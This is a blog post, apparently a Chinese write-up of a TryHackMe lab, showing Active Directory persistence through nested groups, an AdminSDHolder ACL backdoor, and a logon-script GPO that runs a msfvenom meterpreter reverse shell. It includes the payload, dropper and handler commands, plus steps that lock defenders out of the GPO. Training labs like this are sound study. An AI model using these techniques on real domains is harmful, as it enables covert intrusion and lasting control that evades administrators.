<h2 id="嵌套组"><a href="#嵌套组" class="headerlink" title="嵌套组"></a>嵌套组</h2><p>在大多数组织中，有大量的递归组。递归组是另一个组的成员。我们可以将其视为组嵌套。组嵌套用于在AD中创建更有条理的结构。以 IT 支持组为例。IT 支持非常通用。因此，该组下可能有诸如帮助台、门禁卡管理员和网络管理员之类的子组。我们可以将所有这些组作为成员添加到 IT 支持组，这将为这些子组中的所有用户提供与 IT 支持组相关的权限和特权，但我们可以为每个子组分配更细粒度的权限和特权。</p>
<p>虽然组嵌套有助于组织AD，但它确实降低了有效访问的可见性。再次以我们的 IT 支持示例为例。如果我们查询AD以获取 IT 支持组的成员资格，它将以 3 的计数响应。但是，由于它是三个组，因此这个计数并不真实。为了了解有效访问，我们现在还必须枚举这些子组。但这些子组也可以有子组。所以问题变成了：“我们应该枚举多少层才能获得真正的有效访问数量？”</p>
<p>这也成为一个监控问题。例如，假设我们有一个警报，当新成员添加到域管理员组时会触发。这是一个很好的警报，但如果用户被添加到域管理员组中的子组，它就不会触发。这是一个非常常见的问题，因为AD由AD团队管理，而警报和监控由 InfoSec 团队管理。我们所需要的只是一点点沟通不畅，而且由于使用了子组，警报不再有效。</p>
<p>作为攻击者，我们可以利用这种降低的可见性来实现持久性。我们不会将目标锁定在那些可以为我们提供环境访问权限的特权组上，而是将注意力集中在子组上。我们不会将自己添加到会引发警报的特权组中，而是将自己添加到不受监控的子组中。</p>
<h2 id="嵌套持久性"><a href="#嵌套持久性" class="headerlink" title="嵌套持久性"></a>嵌套持久性</h2><p>让我们模拟这种类型的持久性。为了允许其他用户也执行该技术，请确保将您的用户名添加到您创建的所有组前面。为了模拟持久性，我们将创建一些我们自己的组。让我们首先创建一个新的基础组，我们将隐藏在 People-&gt;IT 组织单位 ( OU ) 中：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path &quot;OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 1&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup1&quot; -DisplayName &quot;&lt;username&gt; Nest Group 1&quot; -GroupScope Global -GroupCategory Security</span><br></pre></td></tr></table></figure>

<p>现在让我们在 People-&gt;Sales OU中创建另一个组，并将我们之前的组添加为成员：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path &quot;OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 2&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup2&quot; -DisplayName &quot;&lt;username&gt; Nest Group 2&quot; -GroupScope Global -GroupCategory Security </span><br><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup2&quot; -Members &quot;&lt;username&gt;_nestgroup1&quot;</span><br></pre></td></tr></table></figure>

<p>我们可以再重复几次，每次都将前一个组添加为成员：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 3&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup3&quot; -DisplayName &quot;&lt;username&gt; Nest Group 3&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup3&quot; -Members &quot;&lt;username&gt;_nestgroup2&quot;</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 4&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup4&quot; -DisplayName &quot;&lt;username&gt; Nest Group 4&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup4&quot; -Members &quot;&lt;username&gt;_nestgroup3&quot;</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 5&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup5&quot; -DisplayName &quot;&lt;username&gt; Nest Group 5&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup5&quot; -Members &quot;&lt;username&gt;_nestgroup4&quot;</span><br></pre></td></tr></table></figure>

<p>对于最后一组，现在让我们将该组添加到域管理员组：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;&lt;username&gt;_nestgroup5&quot;</span><br></pre></td></tr></table></figure>

<p>最后，让我们将低权限的AD用户添加到我们创建的第一个组中：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup1&quot; -Members &quot;&lt;low privileged username&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>现在，您的低权限用户应该可以访问 THMDC 了。让我们使用THMWRK1 上的SSH终端来验证这一点：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">za\aaron.jones@THMWRK1 C:\Users\aaron.jones&gt;dir \\thmdc.za.tryhackme.loc\c</span><br><span class="line">$\ </span><br><span class="line"> Volume in drive \\thmdc.za.tryhackme.loc\c$</span><br><span class="line"> is Windows</span><br><span class="line"> Volume Serial Number is 1634-22A9</span><br><span class="line"> Directory of \\thmdc.za.tryhackme.loc\c$</span><br><span class="line">01/04/2022  08:47 AM               103 delete-vagrant-user.ps1     </span><br><span class="line">05/01/2022  09:11 AM               169 dns_entries.csv</span><br><span class="line">09/15/2018  08:19 AM    &lt;DIR&gt;          PerfLogs</span><br><span class="line">05/11/2022  10:32 AM    &lt;DIR&gt;          Program Files</span><br><span class="line">03/21/2020  09:28 PM    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">05/01/2022  09:17 AM             1,725 thm-network-setup-dc.ps1    </span><br><span class="line">04/25/2022  07:13 PM    &lt;DIR&gt;          tmp</span><br><span class="line">05/15/2022  09:16 PM    &lt;DIR&gt;          Tools</span><br><span class="line">04/27/2022  08:22 AM    &lt;DIR&gt;          Users</span><br><span class="line">04/25/2022  07:11 PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant] </span><br><span class="line">04/27/2022  08:12 PM    &lt;DIR&gt;          Windows</span><br><span class="line">               3 File(s)          1,997 bytes</span><br><span class="line">               8 Dir(s)  51,573,755,904 bytes free</span><br></pre></td></tr></table></figure>

<p>我们还要验证一下，尽管我们创建了多个组，但域管理员组只有一名新成员：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt; Get-ADGroupMember -Identity &quot;Domain Admins&quot;</span><br><span class="line">distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=loc</span><br><span class="line">name              : Administrator</span><br><span class="line">objectClass       : user</span><br><span class="line">objectGUID        : 0bbd7980-b53b-4634-8a28-57e4234655c2</span><br><span class="line">SamAccountName    : Administrator</span><br><span class="line">SID               : S-1-5-21-3885271727-2693558621-2658995185-500</span><br><span class="line">distinguishedName : CN=Am0 Net Group 5,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc</span><br><span class="line">name              : Am0 Net Group 5</span><br><span class="line">objectClass       : group</span><br><span class="line">objectGUID        : ba545574-6af9-4a3d-a8df-24ab582fc04c</span><br><span class="line">SamAccountName    : am0_nestgroup5</span><br><span class="line">SID               : S-1-5-21-3885271727-2693558621-2658995185-6163</span><br></pre></td></tr></table></figure>

<h1 id="通过ACL进行权限维持"><a href="#通过ACL进行权限维持" class="headerlink" title="通过ACL进行权限维持"></a>通过ACL进行权限维持</h1><h2 id="通过AD组模板持久保存"><a href="#通过AD组模板持久保存" class="headerlink" title="通过AD组模板持久保存"></a>通过AD组模板持久保存</h2><p>虽然我们可以将我们控制的帐户添加到我们能找到的每个特权组中，但蓝队仍然能够执行清理并删除我们的成员资格。为了确保更好的持久性并让蓝队感到困惑，我们应该注入生成默认组的模板。通过注入这些模板，即使他们删除了我们的成员资格，我们只需等到模板刷新，我们就会再次获得成员资格。</p>
<p>其中一个模板是 AdminSDHolder容器。此 容器存在于每个AD域中，其访问控制列表 ( ACL ) 用作模板，将权限复制到所有受保护组。受保护组包括域管理员、管理员、企业管理员和架构管理员等特权组。如果您正在寻找组的完整列表，可以<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)">在此处</a>找到它们。</p>
<p>一个名为 SDProp 的进程每 60 分钟获取AdminSDHolder容器的ACL并将其应用于所有受保护组。因此，我们可以编写一个 ACE，授予我们对所有受保护组的完整权限。如果蓝队不知道正在使用这种类型的持久性，那将非常令人沮丧。每次他们删除受保护对象或组的不适当权限时，该权限都会在一小时内重新出现。由于此重建是通过正常的AD流程进行的，因此它也不会向蓝队显示任何警报，这使得更难确定持久性的来源。</p>
<h2 id="使用-AdminSDHolder-进行持久化"><a href="#使用-AdminSDHolder-进行持久化" class="headerlink" title="使用 AdminSDHolder 进行持久化"></a>使用 AdminSDHolder 进行持久化</h2><p>为了将持久性部署到 AdminSDHolder，我们将使用 Microsoft 管理控制台 (MMC)。为了避免将用户踢出他们的RDP会话，最好使用低权限凭据通过RDP进入 THMWRK1，使用 runas 命令注入管理员凭据，然后从这个新终端执行 MMC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe</span><br></pre></td></tr></table></figure>

<p>打开 MMC 窗口后，添加用户和组管理单元（文件-&gt;添加管理单元-&gt;Active Directory 用户和计算机）。 确保启用高级功能（查看-&gt;高级功能）。我们可以在域-&gt;系统下找到 AdminSDHolder 组：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528829.png?raw=true" alt="img"></p>
<p>导航到组的安全性（右键单击-&gt;属性-&gt;安全）：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528709.png?raw=true" alt="img"></p>
<p>让我们添加低权限用户并授予完全控制权：</p>
<ol>
<li>单击**“添加”**。</li>
<li>搜索您的低权限用户名并单击**“检查名称”**。</li>
<li>单击**“确定”**。</li>
<li>单击**“完全控制”<strong>上的</strong>“允许”**。</li>
<li>单击**“应用”**。</li>
<li>单击**“确定”**。</li>
</ol>
<p>它看起来应该是这样的：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528149.png?raw=true" alt="img"></p>
<h2 id="可持续发展政策"><a href="#可持续发展政策" class="headerlink" title="可持续发展政策"></a>可持续发展政策</h2><p>现在我们只需等待 60 分钟，我们的用户将拥有对所有受保护组的完全控制权。这是因为安全描述符传播器 (SDProp) 服务每 60 分钟自动执行一次，并将此更改传播到所有受保护组。但是，由于我们不喜欢等待，让我们使用 Powershell 手动启动该过程。在<code>C:\Tools\</code>目录中，提供了一个脚本<code>Invoke-ADSDPropagation</code>：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Tools&gt; Import-Module .\Invoke-ADSDPropagation.ps1 </span><br><span class="line">PS C:\Tools&gt; Invoke-ADSDPropagation</span><br></pre></td></tr></table></figure>

<p>完成后，请花一点时间，然后检查受保护组（例如域管理员组）的安全权限（您可以使用搜索命令来找到该组）：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528292.png?raw=true" alt="img"></p>
<p>可以看出，我们的低权限用户对该组具有完全控制权。您可以通过从安全权限中删除您的用户并重新运行PowerShell脚本来验证这是否会继续传播。您的用户将被再次添加。有趣的是，虽然我们有权修改该组，但它不会自动将我们添加到该组中：</p>
<p>但是，使用我们的新权限，我们可以将自己添加到该组中：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528184.png?raw=true" alt="img"></p>
<h1 id="通过GPO进行权限维持"><a href="#通过GPO进行权限维持" class="headerlink" title="通过GPO进行权限维持"></a>通过GPO进行权限维持</h1><h2 id="域范围持久性"><a href="#域范围持久性" class="headerlink" title="域范围持久性"></a>域范围持久性</h2><p>以下是一些常见的GPO 持久性技术：</p>
<ul>
<li>受限组成员资格-这可以允许我们对域中的所有主机进行管理访问</li>
<li>登录脚本部署 - 这将确保每次用户向域中的主机进行身份验证时，我们都会收到 shell 回调。</li>
</ul>
<p>有许多不同的钩子可以部署。你可以尝试使用 GPO 来了解其他钩子。由于我们已经在利用AD空间中使用了第一个钩子“受限组成员身份”。现在让我们关注第二个钩子。虽然可以访问所有主机很不错，但如果确保我们在管理员积极处理它们时可以访问它们，那就更好了。为此，我们将创建一个链接到管理员OU 的GPO，这将允许我们在每次管理员之一向主机进行身份验证时获取主机上的 shell。</p>
<p>在创建GPO之前，我们首先需要创建 shell、监听器以及将执行 shell 的实际 bat 文件。让我们首先生成一个可以使用的基本可执行 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe &gt; &lt;username&gt;_shell.exe</span><br></pre></td></tr></table></figure>

<p>确保将您的用户名添加到二进制名称中，以避免覆盖其他用户的 shell。Windows 允许我们通过登录 GPO 执行批处理或 PowerShell 脚本。批处理脚本通常比 PowerShell 脚本更稳定，因此让我们创建一个将可执行文件复制到主机并在用户验证后执行的脚本。<code>&lt;username&gt;_script.bat</code>在 AttackBox 上创建以下脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\&lt;username&gt;_shell.exe C:\tmp\&lt;username&gt;_shell.exe &amp;&amp; timeout /t 20 &amp;&amp; C:\tmp\&lt;username&gt;_shell.exe</span><br></pre></td></tr></table></figure>

<p>您将看到该脚本执行了三个用 连接在一起的命令<code>&amp;&amp;</code>。该脚本会将二进制文件从 SYSVOL 目录复制到本地计算机，然后等待 20 秒，最后执行二进制文件。</p>
<p>我们可以使用 SCP 和管理员凭据将两个脚本复制到 SYSVOL 目录：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$thm scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/</span><br><span class="line">$thm scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/</span><br></pre></td></tr></table></figure>

<p>最后，让我们启动 MSF 监听器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/``meterpreter``/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit&quot;</span><br></pre></td></tr></table></figure>

<p>现在我们的准备工作已经完成，我们终于可以创建将执行它的GPO了。您需要通过RDP进入 THMWRK1，并使用以管理员身份运行的运行方式窗口执行后续步骤。</p>
<h2 id="GPO创建"><a href="#GPO创建" class="headerlink" title="GPO创建"></a>GPO创建</h2><p>第一步使用我们的域管理员帐户打开组策略管理单元：</p>
<ol>
<li>在 runas-spawned 终端中，输入 MMC 并按回车键。</li>
<li>单击<strong>文件</strong>-&gt;<strong>添加&#x2F;删除管理单元…</strong></li>
<li>选择<strong>组策略管理管理</strong>单元并单击<strong>添加</strong></li>
<li>单击**“确定”**</li>
</ol>
<p>您应该能够看到GPO管理器：</p>
<p>虽然从技术上讲，我们可以将内容写入默认域策略，该策略应该传播到所有AD对象，但我们将采取更狭隘的方法来完成任务，只是为了展示该过程。之后您可以尝试将更改应用于整个域。</p>
<p>我们将编写一个适用于所有管理员的GPO ，因此右键单击管理员OU，然后选择在此域中创建GPO，然后在此处链接。为您的GPO命名，例如<code>username - persisting GPO</code>：</p>
<p>右键单击您的策略并选择强制执行。这将确保您的策略适用，即使存在冲突的策略。这有助于确保我们的GPO优先，即使蓝队编写了将删除我们更改的策略。现在您可以右键单击您的策略并选择编辑：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528025.png?raw=true" alt="img"></p>
<p>让我们回到组策略管理编辑器：</p>
<ol>
<li>在用户配置下，展开<strong>策略-&gt;Windows 设置</strong>。</li>
<li>选择<strong>脚本（登录&#x2F;注销）</strong>。</li>
<li>右键单击**“登录”-&gt;“属性”**</li>
<li>选择**“脚本”**选项卡。</li>
<li>单击<strong>添加-&gt;浏览</strong>。</li>
</ol>
<p>让我们导航到存储批处理和二进制文件的位置：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528632.png?raw=true" alt="img"></p>
<p>选择批处理文件作为脚本，然后单击**“打开”<strong>和</strong>“确定”<strong>。单击</strong>“应用”<strong>和</strong>“确定”**。这将确保每次管理员（第 2、1 和 0 层）登录任何机器时，我们都会收到回调。</p>
<p>为了模拟这种情况，让我们重置其中一个第 1 层管理员帐户的密码并向服务器进行身份验证。使用您在之前的AD室中学到的任何技术来重置其中一个第 1 层管理员的密码。完成后，请记住启动您的 MSF 多处理程序，然后让我们通过 RDPing 进入 THMSERVER1 或 THMSERVER2 进行测试！</p>
<p>使用您的第 1 层管理员凭据，通过RDP进入其中一台服务器。如果您再等一分钟，您应该会在多处理器上收到回调：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run </span><br><span class="line">Started reverse TCP handler on 172.31.16.251:4445 </span><br><span class="line">[*] Sending stage (176195 bytes) to 172.31.1.201 </span><br><span class="line">[*] Meterpreter session 1 opened (172.31.16.251:4445 -&gt; 172.31.1.201:63695) at 2022-05-07 10:06:28 +0100 </span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p>注意：您需要创建一个登录事件以供GPO执行。如果您刚刚关闭了RDP会话，则只会执行断开连接，这意味着它不会触发GPO。确保选择导航以退出（如下所示）以终止会话。这将确保在您重新进行身份验证时生成登录事件：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528449.png?raw=true" alt="img"></p>
<h2 id="隐藏在显眼的地方"><a href="#隐藏在显眼的地方" class="headerlink" title="隐藏在显眼的地方"></a>隐藏在显眼的地方</h2><p>现在我们知道我们的持久性正在发挥作用，现在是时候确保蓝队不能简单地删除我们的持久性了。返回到您的 MMC 窗口，单击您的策略，然后单击委派：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528487.png?raw=true" alt="img"></p>
<p>默认情况下，所有管理员都具有编辑 GPO 的能力。让我们删除这些权限：</p>
<ol>
<li><strong>右键单击</strong>企业<strong>域控制器</strong>并选择<strong>编辑设置、删除、修改安全性</strong>。</li>
<li><strong>单击</strong>所有其他组（经过身份验证的用户除外），然后单击**“删除”**。</li>
</ol>
<p>你应该留下如下的代表团：</p>
<p>单击“高级”并从权限中删除创建的所有者：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528833.png?raw=true" alt="img"></p>
<p>默认情况下，所有经过身份验证的用户都必须具有读取策略的能力。这是必需的，因为否则，当用户通过身份验证应用用户策略时，用户的帐户将无法读取策略。如果我们没有登录脚本，我们也可以删除此权限，以确保几乎没有人能够读取我们的策略。</p>
<p>我们可以用域计算机替换经过身份验证的用户，以确保计算机仍然可以读取和应用策略，但阻止任何用户读取策略。让我们这样做进行测试，但请记住，这可能会导致您在身份验证时无法获得 shell 回调，因为用户将无法读取PowerShell脚本，因此请确保在执行这些步骤之前测试您的 shell。<strong>这之后就没有回头路了：</strong></p>
<ol>
<li>单击**“添加”**。</li>
<li>键入<strong>域计算机</strong>，单击<strong>检查名称</strong>，然后<strong>单击确定</strong>。</li>
<li>选择<strong>读取权限</strong>并单击<strong>确定</strong>。</li>
<li>单击**“经过身份验证的用户”<strong>，然后单击</strong>“删除”**。</li>
</ol>
<p>执行完这些步骤后，您将收到一条错误消息，提示您无法再读取您自己的策略：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528301.png?raw=true" alt="img"></p>
<p>您还可以在侧边栏看到我们无法再阅读此政策：</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528860.png?raw=true" alt="img"></p>
<p>通过执行这些步骤，我们可以确保即使拥有最高级别的权限，蓝队也无法删除我们的GPO，除非他们模拟域控制器的机器帐户。这使得首次发现它变得格外困难，即使他们发现了GPO，删除它也非常困难。我们甚至不再具有与我们的策略交互所需的权限，因此必须一直待在那里直到执行网络重置。您可以通过 RDPing 进入其中一个 THMSERVERS 来验证GPO是否仍在应用。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">deCOLE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/27/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BPersisting%20Active%20Directory/">http://example.com/2025/05/27/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BPersisting%20Active%20Directory/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">deCOLE's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/TryHackMe/">TryHackMe</a></div><div class="post-share"><div class="social-share" data-image="/img/touxiang.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BEnterprise/" title="TryHackMe房间之Enterprise"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">TryHackMe房间之Enterprise</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/07/08/%E5%88%9D%E6%8E%A2%E5%85%8D%E6%9D%80%E5%B0%8F%E5%9F%BA%E7%A1%80/" title="初探免杀小基础"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">初探免杀小基础</div></div><div class="info-2"><div class="info-item-1">基础部分Cobalt Strike基础部分大部分自行了解，只记部分 参考：https://cloud.tencent.com/developer/article/1595548 BeaconBeacon是CS在目标主机上运行的****payload，在隐蔽的隧道上为我们提供服务，以此长期控制主机 在实际渗透中，我们可以将其嵌入到可执行文件、Word文档或者利用主机漏洞传递Beacon Beacon功能包括：  使用HTTP&#x2F;DNS检查是否有待执行任务 连接多个C2域名 分段传输后自动迁移 与CS集成，通过社工、主机漏洞以及会话等方式来传递Beacon  Beacon的工作原理  Beacon上线后会主动向我们设置好的Listener发送请求信息 而Team...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BBilling/" title="TryHackMe房间之Billing"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-09</div><div class="info-item-2">TryHackMe房间之Billing</div></div><div class="info-2"><div class="info-item-1">TryHackMe房间之Billing总结从没见过的fail2ban提权，不过倒是启发了以后寻找提权点的思路 找一些自己有权限修改，且以高权限用户身份运行的文件或者服务 流程记录扫端口情况如下  对80端口扫描目录 只扫到个robots.txt  直接访问页面，发现就在&#x2F;mbilling下，于是dirsearch再扫一下  找到一个readme  在readme里面找到了版本号  搜索发现存在历史漏洞 https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit 用exp直接拿到shell  找到user.txt，在&#x2F;home&#x2F;magnus下  接下来就是权限提升的环节 先sudo -l查看一下  发现我们能够以root权限执行fail2ban Fail2ban是一个入侵防御软件框架。Fail2Ban...</div></div></div></a><a class="pagination-related" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BReset/" title="TryHackMe房间之Reset"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-09</div><div class="info-item-2">TryHackMe房间之Reset</div></div><div class="info-2"><div class="info-item-1">TryHackMe房间之Reset总结对smb还是有点不熟悉，没想到这个smb共享也能打一波强制身份验证来获取哈希，学到了 还有就是bloodhound的使用不够熟练 流程记录rustscan扫描结果如下  enum4linux 枚举发现  用crackmapexec枚举smb，发现域名  添加到&#x2F;etc&#x2F;hosts中 再用smbclient枚举一下  用空密码尝试连接，发现Data下的onboarding文件夹有一些文件  下载到本地  发现里面是一些介绍公司相关的？英语不太好  在第一个pdf里面看到了一个欢迎的email内容示例，得到初始密码：RessetMe123!  所以接下来的思路应该就是：枚举用户然后用初始密码进行密码喷洒 这里靶机中断了，因此ip变动一下 注意到共享文件夹里面的文件会发生变动，这意味着域内用户会访问这个共享文件夹  于是我们便可以在这个文件夹中添加一个恶意文件，用户在读取文件时进行强制身份验证，以此来获取ntlm...</div></div></div></a><a class="pagination-related" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BEnterprise/" title="TryHackMe房间之Enterprise"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-09</div><div class="info-item-2">TryHackMe房间之Enterprise</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Windows%E5%86%85%E9%83%A8/" title="Windows内部"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Windows内部</div></div><div class="info-2"><div class="info-item-1">Windows内部进程（Processes）每个进程都提供执行程序所需要的资源 进程具有虚拟空间、可执行代码、系统对象的开放句柄、安全上下文、唯一进程标识符、环境变量、优先级类、最小和最大工作及大小、至少一个执行线程 每个进程都用单个线程（通常称为主线程）启动，但可以从其任何线程创建其他线程    进程组件 作用    私有虚拟地址空间 为进程分配虚拟内存地址   可执行程序 定义存储在虚拟地址空间中的代码和数据   开放句柄 定义进程可以访问的系统资源的句柄   安全上下文 访问令牌，定义用户、权限和其他安全信息   进程ID 进程的唯一数字标识符   线程 计划执行的进程部分   从更底层的层面来看，也就是从虚拟地址空间一层面来解释进程 进程在内存中的组件和用途大概如下    组件 用途    代码(Code) 提供进程执行的代码   